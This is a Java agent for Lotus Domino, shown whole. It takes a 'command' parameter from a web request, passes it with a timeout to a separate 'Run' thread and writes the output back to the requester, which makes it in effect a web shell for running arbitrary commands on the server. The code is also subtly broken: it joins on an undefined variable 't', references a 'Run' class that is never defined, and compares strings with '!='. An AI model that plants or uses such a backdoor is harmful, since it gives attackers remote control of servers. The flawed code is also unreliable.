import lotus.domino.*;
import java.util.HashMap;
import java.util.Map;

public class JavaAgent extends AgentBase {

    public void NotesMain() {       
        try {
            Session session = getSession();
            AgentContext agentContext = session.getAgentContext();
            java.io.PrintWriter pw = getAgentOutput();
            Document doc = agentContext.getDocumentContext();

            String request = doc.getItemValueString("request_content");
            if (request != "") {
                Map<String, String> args = SplitArgs(request);
                if (args.containsKey("command")) { 
                     Integer timeout = 10; // default timeout in seconds
                     if (args.containsKey("timeout")){
                         timeout = Integer.parseInt(args.get("timeout"));
                     }
                     timeout *= 1000;
                     String command = args.get("command");  
                     
                     Thread thread = new Run(pw, command, timeout);
                     thread.start();            
                     thread.join(t);
                }
            }
        }
        catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    @SuppressWarnings("finally")
    private Map<String, String> SplitArgs(String query) {
        Map<String, String> map = new HashMap<String, String>();
        try {
           String [] params = query.split("&");
           for (String param : params)
           {
               String n = param.split("=")[0];
               String v = param.split("=")[1];
               map.put(n, v);
           }
        }
        catch(Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        finally {
            return map;
        }
    } 
}
